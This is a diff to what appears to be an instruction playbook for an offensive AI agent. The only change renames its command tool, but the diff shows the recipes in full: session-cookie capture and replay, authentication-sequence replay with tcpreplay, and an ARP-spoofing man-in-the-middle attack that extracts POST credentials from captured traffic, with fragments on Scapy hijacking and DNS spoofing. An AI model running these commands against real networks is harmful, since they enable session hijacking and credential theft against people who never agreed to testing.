@@ -162,10 +162,10 @@ Your primary directives are:
 ### 1. HTTP Session Token Replay
 ```bash
 # Capture HTTP traffic
-generic_linux_command("tcpdump", "-i eth0 -w http_capture.pcap 'port 80'")
+run_command("tcpdump", "-i eth0 -w http_capture.pcap 'port 80'")
 
 # Extract session cookies from PCAP
-generic_linux_command("tshark", "-r http_capture.pcap -Y 'http.request' -T fields -e http.cookie")
+run_command("tshark", "-r http_capture.pcap -Y 'http.request' -T fields -e http.cookie")
 
 # Replay the captured request with Scapy
 execute_code("""
@@ -236,13 +236,13 @@ send(hijack_pkt)
 ### 4. Authentication Sequence Replay
 ```bash
 # Capture authentication traffic
-generic_linux_command("tcpdump", "-i eth0 -w auth_capture.pcap 'port 443 and host auth.target.com'")
+run_command("tcpdump", "-i eth0 -w auth_capture.pcap 'port 443 and host auth.target.com'")
 
 # Extract authentication packets
-generic_linux_command("tshark", "-r auth_capture.pcap -Y 'http.request.method==POST' -w auth_only.pcap")
+run_command("tshark", "-r auth_capture.pcap -Y 'http.request.method==POST' -w auth_only.pcap")
 
 # Replay authentication sequence
-generic_linux_command("tcpreplay", "-i eth0 -t -K auth_only.pcap")
+run_command("tcpreplay", "-i eth0 -t -K auth_only.pcap")
 ```
 
 ### 5. JWT Token Replay
@@ -292,16 +292,16 @@ sniff(filter='udp port 53', prn=dns_spoof)
 ### 7. MITM with ARP Spoofing
 ```bash
 # Enable IP forwarding
-generic_linux_command("sysctl", "-w net.ipv4.ip_forward=1")
+run_command("sysctl", "-w net.ipv4.ip_forward=1")
 
 # ARP spoof target and gateway
-generic_linux_command("arpspoof", "-i eth0 -t 192.168.1.100 192.168.1.1")
+run_command("arpspoof", "-i eth0 -t 192.168.1.100 192.168.1.1")
 
 # In another terminal, capture traffic
-generic_linux_command("tcpdump", "-i eth0 -w mitm_capture.pcap")
+run_command("tcpdump", "-i eth0 -w mitm_capture.pcap")
 
 # Analyze captured credentials
-generic_linux_command("tshark", "-r mitm_capture.pcap -Y 'http.request.method==POST' -T fields -e http.file_data")
+run_command("tshark", "-r mitm_capture.pcap -Y 'http.request.method==POST' -T fields -e http.file_data")
 ```
 
 ---
